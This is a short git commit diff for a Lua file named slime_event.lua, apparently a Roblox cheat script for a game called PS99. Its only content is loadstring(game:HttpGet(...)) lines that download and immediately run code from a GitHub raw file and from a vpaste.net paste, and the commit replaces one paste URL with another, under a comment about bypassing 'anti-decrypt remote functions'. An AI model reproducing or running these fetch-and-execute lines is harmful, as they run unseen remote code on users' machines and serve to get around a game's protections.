933ec49c505bd10ccb939430b456de5428787f45
Verteniastyy <marvnesterwhahaha@gmail.com>
2025-04-07 02:08:06 +0800

    Update slime_event.lua

--- slime_event.lua
+++ slime_event.lua
@@ -7,7 +7,8 @@ wait(0.5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Verteniastyy/PS99/refs/heads/main/e8ea4b8833ce3d69.lua", true))()
 
 -- This script is used to bypass anti-decrypt remote functions
-loadstring(game:HttpGet("http://vpaste.net/FKorj", true))()
+loadstring(game:HttpGet("http://vpaste.net/ek3oU", true))()
+
 
 
 
